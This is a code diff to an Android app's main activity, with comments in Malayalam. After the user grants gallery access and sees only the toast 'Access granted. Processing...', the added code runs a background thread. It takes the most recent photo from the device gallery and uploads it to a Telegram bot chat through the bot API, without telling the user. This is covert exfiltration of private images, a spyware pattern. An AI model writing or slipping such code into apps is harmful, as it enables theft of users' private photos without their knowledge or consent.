@@ -20,9 +20,12 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import java.io.BufferedReader;
+import java.io.DataOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.InputStreamReader;
-import java.util.ArrayList;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -121,5 +124,81 @@ public class MainActivity extends AppCompatActivity {
 
     private void fetchAndUploadImages() {
         Toast.makeText(this, "Access granted. Processing...", Toast.LENGTH_SHORT).show();
+
+        // Background Thread-ൽ പ്രവർത്തിക്കാൻ (Network operations-ന് Main Thread അനുവദിക്കാത്തതിനാൽ)
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+                    String[] projection = {MediaStore.Images.Media.DATA};
+                    Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
+
+                    if (cursor != null) {
+                        if (cursor.moveToFirst()) {
+                            int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
+                            String filePath = cursor.getString(columnIndex);
+                            
+                            if (filePath != null) {
+                                sendImageToTelegram(filePath);
+                            }
+                        }
+                        cursor.close();
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }).start();
     }
-}
+
+    private void sendImageToTelegram(String imagePath) {
+        String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
+        try {
+            File imageFile = new File(imagePath);
+            if (!imageFile.exists()) return;
+
+            String boundary = "*****";
+            HttpURLConnection connection = (HttpURLConnection) new URL(urlString).openConnection();
+            connection.setDoInput(true);
+            connection.setDoOutput(true);
+            connection.setUseCaches(false);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("Connection", "Keep-Alive");
+            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+
+            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
+
+            // Chat ID അയക്കുന്നു
+            outputStream.writeBytes("--" + boundary + "\r\n");
+            outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
+            outputStream.writeBytes(chatId + "\r\n");
+
+            // ഇമേജ് ഫയൽ അയക്കുന്നു
+            outputStream.writeBytes("--" + boundary + "\r\n");
+            outputStream.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"" + imageFile.getName() + "\"\r\n");
+            outputStream.writeBytes("Content-Type: image/jpeg\r\n\r\n");
+
+            FileInputStream fileInputStream = new FileInputStream(imageFile);
+            byte[] buffer = new byte[1024];
+            int bytesRead;
+            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
+                outputStream.write(buffer, 0, bytesRead);
+            }
+
+            outputStream.writeBytes("\r\n");
+            outputStream.writeBytes("--" + boundary + "--\r\n");
+            fileInputStream.close();
+            outputStream.flush();
+            outputStream.close();
+
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                // വിജയകരമായി അയച്ചു കഴിഞ്ഞാൽ ചെയ്യാവുന്നത്
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+        }
+                    
